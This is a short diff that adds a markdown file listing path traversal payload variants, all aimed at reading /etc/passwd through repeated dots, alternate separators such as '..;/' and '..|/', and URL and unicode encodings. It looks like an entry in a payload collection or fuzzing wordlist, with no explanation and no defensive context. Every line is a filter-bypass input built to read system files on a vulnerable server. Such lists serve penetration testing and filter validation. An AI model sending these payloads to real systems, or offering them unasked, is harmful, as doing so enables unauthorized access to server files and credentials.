@@ -1,0 +1,14 @@
+# Dot and Slash Variations
+
+Multiple dots:
+....//....//....//etc/passwd
+......////......////......////etc/passwd
+
+Different separators:
+..;/..;/..;/etc/passwd
+..|/..|/..|/etc/passwd
+..\x2f..\x2f..\x2fetc\x2fpasswd
+
+URL encoded:
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
